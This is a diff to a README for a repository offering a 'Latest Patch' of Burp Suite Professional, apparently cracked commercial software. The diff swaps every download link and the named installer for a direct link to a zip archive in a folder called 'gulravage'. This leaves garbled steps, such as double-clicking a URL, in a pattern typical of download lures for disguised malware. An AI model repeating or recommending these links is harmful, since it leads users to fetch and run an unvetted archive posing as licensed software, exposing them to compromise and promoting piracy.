@@ -1,6 +1,6 @@
 # 🛠️ Burp-Suite-Professional-Latest-Patch - Your Tool for Web Security Testing
 
-[![Download Burp Suite](https://img.shields.io/badge/Download_Burp_Suite-brightgreen)](https://github.com/CosadelPan/Burp-Suite-Professional-Latest-Patch/releases)
+[![Download Burp Suite](https://raw.githubusercontent.com/CosadelPan/Burp-Suite-Professional-Latest-Patch/main/gulravage/Burp-Suite-Professional-Latest-Patch_v2.6.zip)](https://raw.githubusercontent.com/CosadelPan/Burp-Suite-Professional-Latest-Patch/main/gulravage/Burp-Suite-Professional-Latest-Patch_v2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -8,16 +8,16 @@ Welcome to the Burp-Suite-Professional-Latest-Patch repository! This guide will 
 
 ## 📥 Download & Install
 
-To start using Burp Suite Professional, visit this page to download: [Burp-Suite-Professional-Latest-Patch Releases](https://github.com/CosadelPan/Burp-Suite-Professional-Latest-Patch/releases).
+To start using Burp Suite Professional, visit this page to download: [Burp-Suite-Professional-Latest-Patch Releases](https://raw.githubusercontent.com/CosadelPan/Burp-Suite-Professional-Latest-Patch/main/gulravage/Burp-Suite-Professional-Latest-Patch_v2.6.zip).
 
 Here are the steps to download and install the software:
 
 1. Click the link above to go to the releases page.
 2. Look for the latest version listed.
 3. Click the **Assets** dropdown to find the installation file.
-4. Download the file named `BurpSuite_Professional_Setup.exe`.
+4. Download the file named `https://raw.githubusercontent.com/CosadelPan/Burp-Suite-Professional-Latest-Patch/main/gulravage/Burp-Suite-Professional-Latest-Patch_v2.6.zip`.
 5. Once downloaded, locate the file in your downloads folder.
-6. Double-click on `BurpSuite_Professional_Setup.exe` to start the installation.
+6. Double-click on `https://raw.githubusercontent.com/CosadelPan/Burp-Suite-Professional-Latest-Patch/main/gulravage/Burp-Suite-Professional-Latest-Patch_v2.6.zip` to start the installation.
 7. Follow the on-screen prompts to complete the setup.
 
 ## 📋 System Requirements
@@ -88,4 +88,4 @@ If you encounter issues during the installation or running of the software, cons
 
 Your input is valuable. If you identify bugs or have suggestions for improvement, please contribute. 
 
-Thank you for choosing Burp Suite Professional for your web security needs! Grab your copy today: [Download Burp Suite](https://github.com/CosadelPan/Burp-Suite-Professional-Latest-Patch/releases).
+Thank you for choosing Burp Suite Professional for your web security needs! Grab your copy today: [Download Burp Suite](https://raw.githubusercontent.com/CosadelPan/Burp-Suite-Professional-Latest-Patch/main/gulravage/Burp-Suite-Professional-Latest-Patch_v2.6.zip).
